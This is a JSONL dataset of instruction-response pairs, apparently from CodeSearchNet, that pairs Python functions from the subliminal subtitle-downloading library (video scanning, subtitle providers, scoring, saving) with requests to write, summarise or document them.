{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsanitizing a string to strip special characters.", "response": "def sanitize(string, ignore_characters=None):\n    \"\"\"Sanitize a string to strip special characters.\n\n    :param str string: the string to sanitize.\n    :param set ignore_characters: characters to ignore.\n    :return: the sanitized string.\n    :rtype: str\n\n    \"\"\"\n    # only deal with strings\n    if string is None:\n        return\n\n    ignore_characters = ignore_characters or set()\n\n    # replace some characters with one space\n    characters = {'-', ':', '(', ')', '.'} - ignore_characters\n    if characters:\n        string = re.sub(r'[%s]' % re.escape(''.join(characters)), ' ', string)\n\n    # remove some characters\n    characters = {'\\''} - ignore_characters\n    if characters:\n        string = re.sub(r'[%s]' % re.escape(''.join(characters)), '', string)\n\n    # replace multiple spaces with one\n    string = re.sub(r'\\s+', ' ', string)\n\n    # strip and lower case\n    return string.strip().lower()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nsanitize a release group string to remove content in square brackets.", "response": "def sanitize_release_group(string):\n    \"\"\"Sanitize a `release_group` string to remove content in square brackets.\n\n    :param str string: the release group to sanitize.\n    :return: the sanitized release group.\n    :rtype: str\n\n    \"\"\"\n    # only deal with strings\n    if string is None:\n        return\n\n    # remove content in square brackets\n    string = re.sub(r'\\[\\w+\\]', '', string)\n\n    # strip and upper case\n    return string.strip().upper()"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nclear the cache for a single item.", "response": "def cache(ctx, clear_subliminal):\n    \"\"\"Cache management.\"\"\"\n    if clear_subliminal:\n        for file in glob.glob(os.path.join(ctx.parent.params['cache_dir'], cache_file) + '*'):\n            os.remove(file)\n        click.echo('Subliminal\\'s cache cleared.')\n    else:\n        click.echo('Nothing done.')"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndownloads best subtitles. PATH can be an directory containing videos, a video file path or a video file name. It can be used multiple times. If an existing subtitle is detected (external or embedded) in the correct language, the download is skipped for the associated video.", "response": "def download(obj, provider, refiner, language, age, directory, encoding, single, force, hearing_impaired, min_score,\n             max_workers, archives, verbose, path):\n    \"\"\"Download best subtitles.\n\n    PATH can be an directory containing videos, a video file path or a video file name. It can be used multiple times.\n\n    If an existing subtitle is detected (external or embedded) in the correct language, the download is skipped for\n    the associated video.\n\n    \"\"\"\n    # process parameters\n    language = set(language)\n\n    # scan videos\n    videos = []\n    ignored_videos = []\n    errored_paths = []\n    with click.progressbar(path, label='Collecting videos', item_show_func=lambda p: p or '') as bar:\n        for p in bar:\n            logger.debug('Collecting path %s', p)\n\n            # non-existing\n            if not os.path.exists(p):\n                try:\n                    video = Video.fromname(p)\n                except:\n                    logger.exception('Unexpected error while collecting non-existing path %s', p)\n                    errored_paths.append(p)\n                    continue\n                if not force:\n                    video.subtitle_languages |= set(search_external_subtitles(video.name, directory=directory).values())\n                refine(video, episode_refiners=refiner, movie_refiners=refiner, embedded_subtitles=not force)\n                videos.append(video)\n                continue\n\n            # directories\n            if os.path.isdir(p):\n                try:\n                    scanned_videos = scan_videos(p, age=age, archives=archives)\n                except:\n                    logger.exception('Unexpected error while collecting directory path %s', p)\n                    errored_paths.append(p)\n                    continue\n                for video in scanned_videos:\n                    if not force:\n                        video.subtitle_languages |= set(search_external_subtitles(video.name,\n                                                                                  directory=directory).values())\n                    if check_video(video, languages=language, age=age, undefined=single):\n                        refine(video, episode_refiners=refiner, movie_refiners=refiner, embedded_subtitles=not force)\n                        videos.append(video)\n                    else:\n                        ignored_videos.append(video)\n                continue\n\n            # other inputs\n            try:\n                video = scan_video(p)\n            except:\n                logger.exception('Unexpected error while collecting path %s', p)\n                errored_paths.append(p)\n                continue\n            if not force:\n                video.subtitle_languages |= set(search_external_subtitles(video.name, directory=directory).values())\n            if check_video(video, languages=language, age=age, undefined=single):\n                refine(video, episode_refiners=refiner, movie_refiners=refiner, embedded_subtitles=not force)\n                videos.append(video)\n            else:\n                ignored_videos.append(video)\n\n    # output errored paths\n    if verbose > 0:\n        for p in errored_paths:\n            click.secho('%s errored' % p, fg='red')\n\n    # output ignored videos\n    if verbose > 1:\n        for video in ignored_videos:\n            click.secho('%s ignored - subtitles: %s / age: %d day%s' % (\n                os.path.split(video.name)[1],\n                ', '.join(str(s) for s in video.subtitle_languages) or 'none',\n                video.age.days,\n                's' if video.age.days > 1 else ''\n            ), fg='yellow')\n\n    # report collected videos\n    click.echo('%s video%s collected / %s video%s ignored / %s error%s' % (\n        click.style(str(len(videos)), bold=True, fg='green' if videos else None),\n        's' if len(videos) > 1 else '',\n        click.style(str(len(ignored_videos)), bold=True, fg='yellow' if ignored_videos else None),\n        's' if len(ignored_videos) > 1 else '',\n        click.style(str(len(errored_paths)), bold=True, fg='red' if errored_paths else None),\n        's' if len(errored_paths) > 1 else '',\n    ))\n\n    # exit if no video collected\n    if not videos:\n        return\n\n    # download best subtitles\n    downloaded_subtitles = defaultdict(list)\n    with AsyncProviderPool(max_workers=max_workers, providers=provider, provider_configs=obj['provider_configs']) as p:\n        with click.progressbar(videos, label='Downloading subtitles',\n                               item_show_func=lambda v: os.path.split(v.name)[1] if v is not None else '') as bar:\n            for v in bar:\n                scores = get_scores(v)\n                subtitles = p.download_best_subtitles(p.list_subtitles(v, language - v.subtitle_languages),\n                                                      v, language, min_score=scores['hash'] * min_score / 100,\n                                                      hearing_impaired=hearing_impaired, only_one=single)\n                downloaded_subtitles[v] = subtitles\n\n        if p.discarded_providers:\n            click.secho('Some providers have been discarded due to unexpected errors: %s' %\n                        ', '.join(p.discarded_providers), fg='yellow')\n\n    # save subtitles\n    total_subtitles = 0\n    for v, subtitles in downloaded_subtitles.items():\n        saved_subtitles = save_subtitles(v, subtitles, single=single, directory=directory, encoding=encoding)\n        total_subtitles += len(saved_subtitles)\n\n        if verbose > 0:\n            click.echo('%s subtitle%s downloaded for %s' % (click.style(str(len(saved_subtitles)), bold=True),\n                                                            's' if len(saved_subtitles) > 1 else '',\n                                                            os.path.split(v.name)[1]))\n\n        if verbose > 1:\n            for s in saved_subtitles:\n                matches = s.get_matches(v)\n                score = compute_score(s, v)\n\n                # score color\n                score_color = None\n                scores = get_scores(v)\n                if isinstance(v, Movie):\n                    if score < scores['title']:\n                        score_color = 'red'\n                    elif score < scores['title'] + scores['year'] + scores['release_group']:\n                        score_color = 'yellow'\n                    else:\n                        score_color = 'green'\n                elif isinstance(v, Episode):\n                    if score < scores['series'] + scores['season'] + scores['episode']:\n                        score_color = 'red'\n                    elif score < scores['series'] + scores['season'] + scores['episode'] + scores['release_group']:\n                        score_color = 'yellow'\n                    else:\n                        score_color = 'green'\n\n                # scale score from 0 to 100 taking out preferences\n                scaled_score = score\n                if s.hearing_impaired == hearing_impaired:\n                    scaled_score -= scores['hearing_impaired']\n                scaled_score *= 100 / scores['hash']\n\n                # echo some nice colored output\n                click.echo('  - [{score}] {language} subtitle from {provider_name} (match on {matches})'.format(\n                    score=click.style('{:5.1f}'.format(scaled_score), fg=score_color, bold=score >= scores['hash']),\n                    language=s.language.name if s.language.country is None else '%s (%s)' % (s.language.name,\n                                                                                             s.language.country.name),\n                    provider_name=s.provider_name,\n                    matches=', '.join(sorted(matches, key=scores.get, reverse=True))\n                ))\n\n    if verbose == 0:\n        click.echo('Downloaded %s subtitle%s' % (click.style(str(total_subtitles), bold=True),\n                                                 's' if total_subtitles > 1 else ''))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef write(self):\n        with open(self.path, 'w') as f:\n            self.config.write(f)", "response": "Write the configuration to the path."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef search_titles(self, title):\n        # make the query\n        logger.info('Searching title %r', title)\n        r = self.session.get(self.server_url + 'legenda/sugestao/{}'.format(title), timeout=10)\n        r.raise_for_status()\n        results = json.loads(r.text)\n\n        # loop over results\n        titles = {}\n        for result in results:\n            source = result['_source']\n\n            # extract id\n            title_id = int(source['id_filme'])\n\n            # extract type and title\n            title = {'type': type_map[source['tipo']], 'title': source['dsc_nome']}\n\n            # extract year\n            if source['dsc_data_lancamento'] and source['dsc_data_lancamento'].isdigit():\n                title['year'] = int(source['dsc_data_lancamento'])\n\n            # extract imdb_id\n            if source['id_imdb'] != '0':\n                if not source['id_imdb'].startswith('tt'):\n                    title['imdb_id'] = 'tt' + source['id_imdb'].zfill(7)\n                else:\n                    title['imdb_id'] = source['id_imdb']\n\n            # extract season\n            if title['type'] == 'episode':\n                if source['temporada'] and source['temporada'].isdigit():\n                    title['season'] = int(source['temporada'])\n                else:\n                    match = season_re.search(source['dsc_nome_br'])\n                    if match:\n                        title['season'] = int(match.group('season'))\n                    else:\n                        logger.warning('No season detected for title %d', title_id)\n\n            # add title\n            titles[title_id] = title\n\n        logger.debug('Found %d titles', len(titles))\n\n        return titles", "response": "Search for titles matching the title."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting the archives from a given title id and language code.", "response": "def get_archives(self, title_id, language_code):\n        \"\"\"Get the archive list from a given `title_id` and `language_code`.\n\n        :param int title_id: title id.\n        :param int language_code: language code.\n        :return: the archives.\n        :rtype: list of :class:`LegendasTVArchive`\n\n        \"\"\"\n        logger.info('Getting archives for title %d and language %d', title_id, language_code)\n        archives = []\n        page = 1\n        while True:\n            # get the archive page\n            url = self.server_url + 'util/carrega_legendas_busca_filme/{title}/{language}/-/{page}'.format(\n                title=title_id, language=language_code, page=page)\n            r = self.session.get(url)\n            r.raise_for_status()\n\n            # parse the results\n            soup = ParserBeautifulSoup(r.content, ['lxml', 'html.parser'])\n            for archive_soup in soup.select('div.list_element > article > div'):\n                # create archive\n                archive = LegendasTVArchive(archive_soup.a['href'].split('/')[2], archive_soup.a.text,\n                                            'pack' in archive_soup['class'], 'destaque' in archive_soup['class'],\n                                            self.server_url + archive_soup.a['href'][1:])\n\n                # extract text containing downloads, rating and timestamp\n                data_text = archive_soup.find('p', class_='data').text\n\n                # match downloads\n                archive.downloads = int(downloads_re.search(data_text).group('downloads'))\n\n                # match rating\n                match = rating_re.search(data_text)\n                if match:\n                    archive.rating = int(match.group('rating'))\n\n                # match timestamp and validate it\n                time_data = {k: int(v) for k, v in timestamp_re.search(data_text).groupdict().items()}\n                archive.timestamp = pytz.timezone('America/Sao_Paulo').localize(datetime(**time_data))\n                if archive.timestamp > datetime.utcnow().replace(tzinfo=pytz.utc):\n                    raise ProviderError('Archive timestamp is in the future')\n\n                # add archive\n                archives.append(archive)\n\n            # stop on last page\n            if soup.find('a', attrs={'class': 'load_more'}, string='carregar mais') is None:\n                break\n\n            # increment page count\n            page += 1\n\n        logger.debug('Found %d archives', len(archives))\n\n        return archives"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndownloading an archive s content.", "response": "def download_archive(self, archive):\n        \"\"\"Download an archive's :attr:`~LegendasTVArchive.content`.\n\n        :param archive: the archive to download :attr:`~LegendasTVArchive.content` of.\n        :type archive: :class:`LegendasTVArchive`\n\n        \"\"\"\n        logger.info('Downloading archive %s', archive.id)\n        r = self.session.get(self.server_url + 'downloadarquivo/{}'.format(archive.id))\n        r.raise_for_status()\n\n        # open the archive\n        archive_stream = io.BytesIO(r.content)\n        if is_rarfile(archive_stream):\n            logger.debug('Identified rar archive')\n            archive.content = RarFile(archive_stream)\n        elif is_zipfile(archive_stream):\n            logger.debug('Identified zip archive')\n            archive.content = ZipFile(archive_stream)\n        else:\n            raise ValueError('Not a valid archive')"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef check_video(video, languages=None, age=None, undefined=False):\n    # language test\n    if languages and not (languages - video.subtitle_languages):\n        logger.debug('All languages %r exist', languages)\n        return False\n\n    # age test\n    if age and video.age > age:\n        logger.debug('Video is older than %r', age)\n        return False\n\n    # undefined test\n    if undefined and Language('und') in video.subtitle_languages:\n        logger.debug('Undefined language found')\n        return False\n\n    return True", "response": "Perform some checks on the video."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef search_external_subtitles(path, directory=None):\n    # split path\n    dirpath, filename = os.path.split(path)\n    dirpath = dirpath or '.'\n    fileroot, fileext = os.path.splitext(filename)\n\n    # search for subtitles\n    subtitles = {}\n    for p in os.listdir(directory or dirpath):\n        # keep only valid subtitle filenames\n        if not p.startswith(fileroot) or not p.endswith(SUBTITLE_EXTENSIONS):\n            continue\n\n        # extract the potential language code\n        language = Language('und')\n        language_code = p[len(fileroot):-len(os.path.splitext(p)[1])].replace(fileext, '').replace('_', '-')[1:]\n        if language_code:\n            try:\n                language = Language.fromietf(language_code)\n            except (ValueError, LanguageReverseError):\n                logger.error('Cannot parse language code %r', language_code)\n\n        subtitles[p] = language\n\n    logger.debug('Found subtitles %r', subtitles)\n\n    return subtitles", "response": "Search for external subtitles from a video file and their associated language."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef scan_video(path):\n    # check for non-existing path\n    if not os.path.exists(path):\n        raise ValueError('Path does not exist')\n\n    # check video extension\n    if not path.endswith(VIDEO_EXTENSIONS):\n        raise ValueError('%r is not a valid video extension' % os.path.splitext(path)[1])\n\n    dirpath, filename = os.path.split(path)\n    logger.info('Scanning video %r in %r', filename, dirpath)\n\n    # guess\n    video = Video.fromguess(path, guessit(path))\n\n    # size and hashes\n    video.size = os.path.getsize(path)\n    if video.size > 10485760:\n        logger.debug('Size is %d', video.size)\n        video.hashes['opensubtitles'] = hash_opensubtitles(path)\n        video.hashes['shooter'] = hash_shooter(path)\n        video.hashes['thesubdb'] = hash_thesubdb(path)\n        video.hashes['napiprojekt'] = hash_napiprojekt(path)\n        logger.debug('Computed hashes %r', video.hashes)\n    else:\n        logger.warning('Size is lower than 10MB: hashes not computed')\n\n    return video", "response": "Scan a video from a path."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef scan_archive(path):\n    # check for non-existing path\n    if not os.path.exists(path):\n        raise ValueError('Path does not exist')\n\n    # check video extension\n    if not path.endswith(ARCHIVE_EXTENSIONS):\n        raise ValueError('%r is not a valid archive extension' % os.path.splitext(path)[1])\n\n    dirpath, filename = os.path.split(path)\n    logger.info('Scanning archive %r in %r', filename, dirpath)\n\n    # rar extension\n    if filename.endswith('.rar'):\n        rar = RarFile(path)\n\n        # filter on video extensions\n        rar_filenames = [f for f in rar.namelist() if f.endswith(VIDEO_EXTENSIONS)]\n\n        # no video found\n        if not rar_filenames:\n            raise ValueError('No video in archive')\n\n        # more than one video found\n        if len(rar_filenames) > 1:\n            raise ValueError('More than one video in archive')\n\n        # guess\n        rar_filename = rar_filenames[0]\n        rar_filepath = os.path.join(dirpath, rar_filename)\n        video = Video.fromguess(rar_filepath, guessit(rar_filepath))\n\n        # size\n        video.size = rar.getinfo(rar_filename).file_size\n    else:\n        raise ValueError('Unsupported extension %r' % os.path.splitext(path)[1])\n\n    return video", "response": "Scan an archive from a path."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nscan the path for videos and their subtitles.", "response": "def scan_videos(path, age=None, archives=True):\n    \"\"\"Scan `path` for videos and their subtitles.\n\n    See :func:`refine` to find additional information for the video.\n\n    :param str path: existing directory path to scan.\n    :param datetime.timedelta age: maximum age of the video or archive.\n    :param bool archives: scan videos in archives.\n    :return: the scanned videos.\n    :rtype: list of :class:`~subliminal.video.Video`\n\n    \"\"\"\n    # check for non-existing path\n    if not os.path.exists(path):\n        raise ValueError('Path does not exist')\n\n    # check for non-directory path\n    if not os.path.isdir(path):\n        raise ValueError('Path is not a directory')\n\n    # walk the path\n    videos = []\n    for dirpath, dirnames, filenames in os.walk(path):\n        logger.debug('Walking directory %r', dirpath)\n\n        # remove badly encoded and hidden dirnames\n        for dirname in list(dirnames):\n            if dirname.startswith('.'):\n                logger.debug('Skipping hidden dirname %r in %r', dirname, dirpath)\n                dirnames.remove(dirname)\n\n        # scan for videos\n        for filename in filenames:\n            # filter on videos and archives\n            if not (filename.endswith(VIDEO_EXTENSIONS) or archives and filename.endswith(ARCHIVE_EXTENSIONS)):\n                continue\n\n            # skip hidden files\n            if filename.startswith('.'):\n                logger.debug('Skipping hidden filename %r in %r', filename, dirpath)\n                continue\n\n            # reconstruct the file path\n            filepath = os.path.join(dirpath, filename)\n\n            # skip links\n            if os.path.islink(filepath):\n                logger.debug('Skipping link %r in %r', filename, dirpath)\n                continue\n\n            # skip old files\n            if age and datetime.utcnow() - datetime.utcfromtimestamp(os.path.getmtime(filepath)) > age:\n                logger.debug('Skipping old file %r in %r', filename, dirpath)\n                continue\n\n            # scan\n            if filename.endswith(VIDEO_EXTENSIONS):  # video\n                try:\n                    video = scan_video(filepath)\n                except ValueError:  # pragma: no cover\n                    logger.exception('Error scanning video')\n                    continue\n            elif archives and filename.endswith(ARCHIVE_EXTENSIONS):  # archive\n                try:\n                    video = scan_archive(filepath)\n                except (NotRarFile, RarCannotExec, ValueError):  # pragma: no cover\n                    logger.exception('Error scanning archive')\n                    continue\n            else:  # pragma: no cover\n                raise ValueError('Unsupported file %r' % filename)\n\n            videos.append(video)\n\n    return videos"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrefining a video using the refiners.", "response": "def refine(video, episode_refiners=None, movie_refiners=None, **kwargs):\n    \"\"\"Refine a video using :ref:`refiners`.\n\n    .. note::\n\n        Exceptions raised in refiners are silently passed and logged.\n\n    :param video: the video to refine.\n    :type video: :class:`~subliminal.video.Video`\n    :param tuple episode_refiners: refiners to use for episodes.\n    :param tuple movie_refiners: refiners to use for movies.\n    :param \\*\\*kwargs: additional parameters for the :func:`~subliminal.refiners.refine` functions.\n\n    \"\"\"\n    refiners = ()\n    if isinstance(video, Episode):\n        refiners = episode_refiners or ('metadata', 'tvdb', 'omdb')\n    elif isinstance(video, Movie):\n        refiners = movie_refiners or ('metadata', 'omdb')\n    for refiner in refiners:\n        logger.info('Refining video with %s', refiner)\n        try:\n            refiner_manager[refiner].plugin(video, **kwargs)\n        except:\n            logger.exception('Failed to refine video')"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nlisting subtitles for a set of videos.", "response": "def list_subtitles(videos, languages, pool_class=ProviderPool, **kwargs):\n    \"\"\"List subtitles.\n\n    The `videos` must pass the `languages` check of :func:`check_video`.\n\n    :param videos: videos to list subtitles for.\n    :type videos: set of :class:`~subliminal.video.Video`\n    :param languages: languages to search for.\n    :type languages: set of :class:`~babelfish.language.Language`\n    :param pool_class: class to use as provider pool.\n    :type pool_class: :class:`ProviderPool`, :class:`AsyncProviderPool` or similar\n    :param \\*\\*kwargs: additional parameters for the provided `pool_class` constructor.\n    :return: found subtitles per video.\n    :rtype: dict of :class:`~subliminal.video.Video` to list of :class:`~subliminal.subtitle.Subtitle`\n\n    \"\"\"\n    listed_subtitles = defaultdict(list)\n\n    # check videos\n    checked_videos = []\n    for video in videos:\n        if not check_video(video, languages=languages):\n            logger.info('Skipping video %r', video)\n            continue\n        checked_videos.append(video)\n\n    # return immediately if no video passed the checks\n    if not checked_videos:\n        return listed_subtitles\n\n    # list subtitles\n    with pool_class(**kwargs) as pool:\n        for video in checked_videos:\n            logger.info('Listing subtitles for %r', video)\n            subtitles = pool.list_subtitles(video, languages - video.subtitle_languages)\n            listed_subtitles[video].extend(subtitles)\n            logger.info('Found %d subtitle(s)', len(subtitles))\n\n    return listed_subtitles"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef download_subtitles(subtitles, pool_class=ProviderPool, **kwargs):\n    with pool_class(**kwargs) as pool:\n        for subtitle in subtitles:\n            logger.info('Downloading subtitle %r', subtitle)\n            pool.download_subtitle(subtitle)", "response": "Download a list of subtitles."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef download_best_subtitles(videos, languages, min_score=0, hearing_impaired=False, only_one=False, compute_score=None,\n                            pool_class=ProviderPool, **kwargs):\n    \"\"\"List and download the best matching subtitles.\n\n    The `videos` must pass the `languages` and `undefined` (`only_one`) checks of :func:`check_video`.\n\n    :param videos: videos to download subtitles for.\n    :type videos: set of :class:`~subliminal.video.Video`\n    :param languages: languages to download.\n    :type languages: set of :class:`~babelfish.language.Language`\n    :param int min_score: minimum score for a subtitle to be downloaded.\n    :param bool hearing_impaired: hearing impaired preference.\n    :param bool only_one: download only one subtitle, not one per language.\n    :param compute_score: function that takes `subtitle` and `video` as positional arguments,\n        `hearing_impaired` as keyword argument and returns the score.\n    :param pool_class: class to use as provider pool.\n    :type pool_class: :class:`ProviderPool`, :class:`AsyncProviderPool` or similar\n    :param \\*\\*kwargs: additional parameters for the provided `pool_class` constructor.\n    :return: downloaded subtitles per video.\n    :rtype: dict of :class:`~subliminal.video.Video` to list of :class:`~subliminal.subtitle.Subtitle`\n\n    \"\"\"\n    downloaded_subtitles = defaultdict(list)\n\n    # check videos\n    checked_videos = []\n    for video in videos:\n        if not check_video(video, languages=languages, undefined=only_one):\n            logger.info('Skipping video %r', video)\n            continue\n        checked_videos.append(video)\n\n    # return immediately if no video passed the checks\n    if not checked_videos:\n        return downloaded_subtitles\n\n    # download best subtitles\n    with pool_class(**kwargs) as pool:\n        for video in checked_videos:\n            logger.info('Downloading best subtitles for %r', video)\n            subtitles = pool.download_best_subtitles(pool.list_subtitles(video, languages - video.subtitle_languages),\n                                                     video, languages, min_score=min_score,\n                                                     hearing_impaired=hearing_impaired, only_one=only_one,\n                                                     compute_score=compute_score)\n            logger.info('Downloaded %d subtitle(s)', len(subtitles))\n            downloaded_subtitles[video].extend(subtitles)\n\n    return downloaded_subtitles", "response": "List and download the best matching subtitles for a set of videos."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef save_subtitles(video, subtitles, single=False, directory=None, encoding=None):\n    saved_subtitles = []\n    for subtitle in subtitles:\n        # check content\n        if subtitle.content is None:\n            logger.error('Skipping subtitle %r: no content', subtitle)\n            continue\n\n        # check language\n        if subtitle.language in set(s.language for s in saved_subtitles):\n            logger.debug('Skipping subtitle %r: language already saved', subtitle)\n            continue\n\n        # create subtitle path\n        subtitle_path = get_subtitle_path(video.name, None if single else subtitle.language)\n        if directory is not None:\n            subtitle_path = os.path.join(directory, os.path.split(subtitle_path)[1])\n\n        # save content as is or in the specified encoding\n        logger.info('Saving %r to %r', subtitle, subtitle_path)\n        if encoding is None:\n            with io.open(subtitle_path, 'wb') as f:\n                f.write(subtitle.content)\n        else:\n            with io.open(subtitle_path, 'w', encoding=encoding) as f:\n                f.write(subtitle.text)\n        saved_subtitles.append(subtitle)\n\n        # check single\n        if single:\n            break\n\n    return saved_subtitles", "response": "Save a list of subtitles on filesystem."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef list_subtitles_provider(self, provider, video, languages):\n        # check video validity\n        if not provider_manager[provider].plugin.check(video):\n            logger.info('Skipping provider %r: not a valid video', provider)\n            return []\n\n        # check supported languages\n        provider_languages = provider_manager[provider].plugin.languages & languages\n        if not provider_languages:\n            logger.info('Skipping provider %r: no language to search for', provider)\n            return []\n\n        # list subtitles\n        logger.info('Listing subtitles with provider %r and languages %r', provider, provider_languages)\n        try:\n            return self[provider].list_subtitles(video, provider_languages)\n        except (requests.Timeout, socket.timeout):\n            logger.error('Provider %r timed out', provider)\n        except:\n            logger.exception('Unexpected error in provider %r', provider)", "response": "List subtitles with a single provider."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list_subtitles(self, video, languages):\n        subtitles = []\n\n        for name in self.providers:\n            # check discarded providers\n            if name in self.discarded_providers:\n                logger.debug('Skipping discarded provider %r', name)\n                continue\n\n            # list subtitles\n            provider_subtitles = self.list_subtitles_provider(name, video, languages)\n            if provider_subtitles is None:\n                logger.info('Discarding provider %s', name)\n                self.discarded_providers.add(name)\n                continue\n\n            # add the subtitles\n            subtitles.extend(provider_subtitles)\n\n        return subtitles", "response": "List all subtitles in the video."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef download_subtitle(self, subtitle):\n        # check discarded providers\n        if subtitle.provider_name in self.discarded_providers:\n            logger.warning('Provider %r is discarded', subtitle.provider_name)\n            return False\n\n        logger.info('Downloading subtitle %r', subtitle)\n        try:\n            self[subtitle.provider_name].download_subtitle(subtitle)\n        except (requests.Timeout, socket.timeout):\n            logger.error('Provider %r timed out, discarding it', subtitle.provider_name)\n            self.discarded_providers.add(subtitle.provider_name)\n            return False\n        except:\n            logger.exception('Unexpected error in provider %r, discarding it', subtitle.provider_name)\n            self.discarded_providers.add(subtitle.provider_name)\n            return False\n\n        # check subtitle validity\n        if not subtitle.is_valid():\n            logger.error('Invalid subtitle')\n            return False\n\n        return True", "response": "Download `subtitle`'s :attr:`~subliminal.subtitle.Subtitle.content`.\n\n        :param subtitle: subtitle to download.\n        :type subtitle: :class:`~subliminal.subtitle.Subtitle`\n        :return: `True` if the subtitle has been successfully downloaded, `False` otherwise.\n        :rtype: bool"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndownload the best matching subtitles for a video.", "response": "def download_best_subtitles(self, subtitles, video, languages, min_score=0, hearing_impaired=False, only_one=False,\n                                compute_score=None):\n        \"\"\"Download the best matching subtitles.\n\n        :param subtitles: the subtitles to use.\n        :type subtitles: list of :class:`~subliminal.subtitle.Subtitle`\n        :param video: video to download subtitles for.\n        :type video: :class:`~subliminal.video.Video`\n        :param languages: languages to download.\n        :type languages: set of :class:`~babelfish.language.Language`\n        :param int min_score: minimum score for a subtitle to be downloaded.\n        :param bool hearing_impaired: hearing impaired preference.\n        :param bool only_one: download only one subtitle, not one per language.\n        :param compute_score: function that takes `subtitle` and `video` as positional arguments,\n            `hearing_impaired` as keyword argument and returns the score.\n        :return: downloaded subtitles.\n        :rtype: list of :class:`~subliminal.subtitle.Subtitle`\n\n        \"\"\"\n        compute_score = compute_score or default_compute_score\n\n        # sort subtitles by score\n        scored_subtitles = sorted([(s, compute_score(s, video, hearing_impaired=hearing_impaired))\n                                  for s in subtitles], key=operator.itemgetter(1), reverse=True)\n\n        # download best subtitles, falling back on the next on error\n        downloaded_subtitles = []\n        for subtitle, score in scored_subtitles:\n            # check score\n            if score < min_score:\n                logger.info('Score %d is below min_score (%d)', score, min_score)\n                break\n\n            # check downloaded languages\n            if subtitle.language in set(s.language for s in downloaded_subtitles):\n                logger.debug('Skipping subtitle: %r already downloaded', subtitle.language)\n                continue\n\n            # download\n            if self.download_subtitle(subtitle):\n                downloaded_subtitles.append(subtitle)\n\n            # stop when all languages are downloaded\n            if set(s.language for s in downloaded_subtitles) == languages:\n                logger.debug('All languages downloaded')\n                break\n\n            # stop if only one subtitle is requested\n            if only_one:\n                logger.debug('Only one subtitle downloaded')\n                break\n\n        return downloaded_subtitles"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nterminating all the : attr : initialized_providers.", "response": "def terminate(self):\n        \"\"\"Terminate all the :attr:`initialized_providers`.\"\"\"\n        logger.debug('Terminating initialized providers')\n        for name in list(self.initialized_providers):\n            del self[name]"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_scores(video):\n    if isinstance(video, Episode):\n        return episode_scores\n    elif isinstance(video, Movie):\n        return movie_scores\n\n    raise ValueError('video must be an instance of Episode or Movie')", "response": "Get the scores dict for the given video."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncomputes the score of the subtitle against the video.", "response": "def compute_score(subtitle, video, hearing_impaired=None):\n    \"\"\"Compute the score of the `subtitle` against the `video` with `hearing_impaired` preference.\n\n    :func:`compute_score` uses the :meth:`Subtitle.get_matches <subliminal.subtitle.Subtitle.get_matches>` method and\n    applies the scores (either from :data:`episode_scores` or :data:`movie_scores`) after some processing.\n\n    :param subtitle: the subtitle to compute the score of.\n    :type subtitle: :class:`~subliminal.subtitle.Subtitle`\n    :param video: the video to compute the score against.\n    :type video: :class:`~subliminal.video.Video`\n    :param bool hearing_impaired: hearing impaired preference.\n    :return: score of the subtitle.\n    :rtype: int\n\n    \"\"\"\n    logger.info('Computing score of %r for video %r with %r', subtitle, video, dict(hearing_impaired=hearing_impaired))\n\n    # get the scores dict\n    scores = get_scores(video)\n    logger.debug('Using scores %r', scores)\n\n    # get the matches\n    matches = subtitle.get_matches(video)\n    logger.debug('Found matches %r', matches)\n\n    # on hash match, discard everything else\n    if 'hash' in matches:\n        logger.debug('Keeping only hash match')\n        matches &= {'hash'}\n\n    # handle equivalent matches\n    if isinstance(video, Episode):\n        if 'title' in matches:\n            logger.debug('Adding title match equivalent')\n            matches.add('episode')\n        if 'series_imdb_id' in matches:\n            logger.debug('Adding series_imdb_id match equivalent')\n            matches |= {'series', 'year'}\n        if 'imdb_id' in matches:\n            logger.debug('Adding imdb_id match equivalents')\n            matches |= {'series', 'year', 'season', 'episode'}\n        if 'tvdb_id' in matches:\n            logger.debug('Adding tvdb_id match equivalents')\n            matches |= {'series', 'year', 'season', 'episode'}\n        if 'series_tvdb_id' in matches:\n            logger.debug('Adding series_tvdb_id match equivalents')\n            matches |= {'series', 'year'}\n    elif isinstance(video, Movie):\n        if 'imdb_id' in matches:\n            logger.debug('Adding imdb_id match equivalents')\n            matches |= {'title', 'year'}\n\n    # handle hearing impaired\n    if hearing_impaired is not None and subtitle.hearing_impaired == hearing_impaired:\n        logger.debug('Matched hearing_impaired')\n        matches.add('hearing_impaired')\n\n    # compute the score\n    score = sum((scores.get(match, 0) for match in matches))\n    logger.info('Computed score %r with final matches %r', score, matches)\n\n    # ensure score is within valid bounds\n    assert 0 <= score <= scores['hash'] + scores['hearing_impaired']\n\n    return score"}
